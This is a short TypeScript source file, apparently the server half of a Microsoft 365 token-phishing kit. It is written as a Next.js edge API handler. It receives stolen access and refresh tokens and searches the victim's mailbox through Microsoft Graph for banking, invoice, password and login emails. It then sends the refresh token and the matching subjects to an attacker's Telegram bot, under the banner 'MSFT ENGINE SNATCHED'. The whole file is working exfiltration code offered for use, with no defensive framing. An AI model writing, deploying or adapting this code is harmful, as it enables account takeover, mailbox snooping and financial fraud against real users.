import { NextRequest, NextResponse } from 'next/server';

export const config = { runtime: 'edge' };

async function triage(token: string) {
  const searchTerms = ['bank', 'invoice', 'password', 'login'];
  try {
    const res = await fetch(`https://graph.microsoft.com/v1.0/me/messages?$search="${searchTerms.join(' OR ')}"&$select=subject,receivedDateTime&$top=5`, {
      headers: { 'Authorization': `Bearer ${token}` }
    });
    
    if (!res.ok) return `[Triage Blocked: ${res.status}]`;

    const data = await res.json();
    if (data && Array.isArray(data.value) && data.value.length > 0) {
      return data.value.map((m: any) => `- [${m.receivedDateTime.split('T')[0]}] ${m.subject}`).join('\n');
    }
    return "No high-value matches found in recent emails.";
  } catch (e) {
    return "Triage engine encountered a runtime error.";
  }
}

export default async function handler(req: NextRequest) {
  if (req.method !== 'POST') return NextResponse.json({ error: 'Method Not Allowed' }, { status: 405 });
  
  const data = await req.json();
  if (data.access_token) {
    const triageResults = await triage(data.access_token);
    
    const text = `🚨 MSFT ENGINE SNATCHED (v3.2)\n\n` +
                 `Refresh Token: ${data.refresh_token}\n\n` +
                 `🔍 AUTO-TRIAGE RESULTS:\n${triageResults}`;

    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
          chat_id: process.env.TELEGRAM_CHAT_ID, 
          text: text,
          disable_web_page_preview: true
      }),
    });
    return NextResponse.json({ status: 'success' });
  }
  return NextResponse.json({ status: 'error' }, { status: 400 });
}